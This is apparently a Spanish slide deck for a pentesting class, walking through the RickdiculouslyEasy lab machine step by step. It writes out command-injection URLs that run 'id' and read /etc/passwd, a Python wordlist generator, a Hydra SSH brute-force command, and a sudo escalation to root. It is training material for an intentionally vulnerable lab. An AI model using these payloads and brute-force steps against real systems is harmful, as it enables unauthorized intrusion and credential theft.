+++
title = "Análisis Práctico de Pentesting"
outputs = ["Reveal"]
+++

## Análisis Práctico de Pentesting
### Caso de Estudio: RickdiculouslyEasy

---

### Objetivos de la Clase

- Aplicar conceptos aprendidos en un escenario real
- Practicar metodología de pentesting
- Entender el proceso de enumeración
- Identificar y explotar vulnerabilidades
- Realizar escalación de privilegios
- Documentar hallazgos

{{% note %}}
En esta sesión final:
- Pondremos en práctica todo lo aprendido
- Seguiremos una metodología estructurada
- Veremos cómo identificar vulnerabilidades
- Aprenderemos técnicas de explotación
- Importante: tomar notas y documentar
{{% /note %}}

---

{{% section %}}

### Fase 1: Reconocimiento Inicial

#### Escaneo de Puertos
```bash
# Escaneo básico de puertos
nmap -p- -sV 192.168.x.x

# Puertos identificados:
# - 21 (FTP)
# - 22 (SSH)
# - 80 (HTTP)
# - 9090 (HTTP)
# - 13337 (Desconocido)
# - 22222 (SSH)
# - 60000 (?)
```

{{% note %}}
Puntos clave del reconocimiento:
- Múltiples servicios web
- FTP con acceso anónimo
- Varios puertos SSH
- Servicios en puertos no estándar
- Documentar TODOS los hallazgos
{{% /note %}}

---

### Análisis Inicial de Servicios

1. **FTP (Puerto 21)**:
```bash
ftp 192.168.x.x
# Usuario: anonymous
# Password: [vacío]
```

2. **Web (Puerto 80)**:
```bash
dirb http://192.168.x.x
# Directorios encontrados:
# - /passwords/
# - /robots.txt
```

{{% note %}}
Recordar:
- Probar credenciales por defecto
- Revisar archivos de configuración
- Buscar información sensible
- Documentar archivos encontrados
{{% /note %}}

{{% /section %}}

---

{{% section %}}

### Fase 2: Enumeración Web

#### Directorios Importantes
```bash
# Revisar /passwords/
curl http://192.168.x.x/passwords/
# - FLAG.txt
# - passwords.html

# Revisar robots.txt
curl http://192.168.x.x/robots.txt
# - /cgi-bin/
# - Traceroute tool
```

{{% note %}}
Aspectos importantes:
1. Revisar código fuente
2. Buscar comentarios ocultos
3. Analizar funcionalidad
4. Identificar vectores de ataque
{{% /note %}}

---

### Command Injection en Traceroute

```bash
# Prueba básica
http://192.168.x.x/cgi-bin/tracertool.cgi?ip=127.0.0.1

# Inyección de comandos
http://192.168.x.x/cgi-bin/tracertool.cgi?ip=127.0.0.1;id

# Lectura de archivos
http://192.168.x.x/cgi-bin/tracertool.cgi?ip=127.0.0.1;more+/etc/passwd
```

{{% note %}}
Técnicas de inyección:
- Usar diferentes delimitadores (;, &&, |)
- Probar comandos básicos
- Evitar caracteres filtrados
- Buscar archivos sensibles
{{% /note %}}

{{% /section %}}

---

{{% section %}}

### Fase 3: Análisis de Credenciales

#### Contraseñas Encontradas
1. En código fuente: `winter`
2. En /etc/passwd: usuario `Summer`
3. Conexión entre usuarios:
```bash
# Login SSH
ssh Summer@192.168.x.x -p 22222
Password: winter
```

{{% note %}}
Metodología:
- Correlacionar información
- Probar credenciales en todos los servicios
- Mantener registro de intentos
- Documentar accesos exitosos
{{% /note %}}

---

### Búsqueda de Archivos Sensibles

```bash
# Como usuario Summer
find / -type f -name "*.txt" 2>/dev/null
find / -type f -name "*.zip" 2>/dev/null
find / -name "*.jpg" 2>/dev/null

# Archivos importantes encontrados:
# - Safe_Password.jpg
# - journal.txt.zip
# - FLAG.txt en varios lugares
```

{{% note %}}
Técnicas de búsqueda:
- Usar diferentes extensiones
- Buscar en directorios comunes
- Revisar permisos
- Extraer metadatos
{{% /note %}}

{{% /section %}}

---

{{% section %}}

### Fase 4: Análisis de Archivos

#### Extracción de Información
```bash
# Examinar imagen
strings Safe_Password.jpg
# Password encontrado: Meeseek

# Descomprimir archivo
unzip journal.txt.zip
Password: Meeseek

# Leer contenido
cat journal.txt
# Número encontrado: 131333
```

{{% note %}}
Proceso de análisis:
- Examinar metadatos
- Buscar strings ocultos
- Probar contraseñas encontradas
- Documentar hallazgos
{{% /note %}}

---

### Fase 5: Explotación del Binario Safe

#### Exploración del directorio RickSanchez
```bash
cd /home/RickSanchez
ls -la
# Encontramos: RICKS_SAFE

cd RICKS_SAFE
ls -la
# Archivo safe con permisos de ejecución
```

{{% note %}}
Análisis del binario:
- Verificar permisos
- Intentar ejecución básica
- Buscar patrones
- Documentar comportamiento
{{% /note %}}

---

### Uso del Binario Safe

1. Ejecutar con código encontrado:
```bash
./safe 131333
# Pistas obtenidas:
# - 1 mayúscula
# - 1 número
# - Palabra de antigua banda
```

2. Investigación:
```bash
# Banda identificada: The Flesh Curtains
# Necesitamos crear wordlist
```

{{% note %}}
Puntos clave:
- Usar información previa
- Analizar output
- Identificar requisitos
- Planear siguiente paso
{{% /note %}}

{{% /section %}}

---

{{% section %}}

### Fase 6: Generación de Wordlist

#### Script Python
```python
#!/usr/bin/python3
from string import ascii_uppercase as au, digits as ds

# Palabras de la banda
band_name = ["Flesh", "Curtains"]

# Generar combinaciones
for l in au:
    for d in ds:
        for n in band_name:
            with open("wordlist.txt", "a") as f:
                f.write(f"{l}{d}{n}\n")
```

{{% note %}}
Elementos del script:
- Una letra mayúscula
- Un dígito
- Palabras clave
- Formato específico
- Archivo de salida
{{% /note %}}

---

### Fase 7: Ataque de Fuerza Bruta

#### Uso de Hydra
```bash
hydra -l RickSanchez -P wordlist.txt 192.168.x.x ssh -s 22222
# Credenciales encontradas:
# Usuario: RickSanchez
# Password: P7Curtains
```

{{% note %}}
Proceso de ataque:
- Configurar parámetros
- Monitorear progreso
- Identificar éxitos
- Documentar resultados
{{% /note %}}

{{% /section %}}

---

{{% section %}}

### Fase 8: Escalación Final de Privilegios

#### Acceso como RickSanchez
```bash
ssh RickSanchez@192.168.x.x -p 22222
Password: P7Curtains

# Verificar privilegios
sudo -l
# Usuario puede ejecutar sudo sin password
```

{{% note %}}
Verificaciones:
- Permisos sudo
- Archivos de configuración
- Capacidades especiales
- Tareas programadas
{{% /note %}}

---

### Obtención de Root

```bash
# Escalar a root
sudo su -
# ¡Acceso root conseguido!

# Verificar
id
# uid=0(root) gid=0(root)
```

{{% note %}}
Pasos finales:
- Documentar proceso completo
- Verificar acceso total
- Recopilar evidencias
- Preparar reporte
{{% /note %}}

{{% /section %}}

---

### ¿Preguntas?
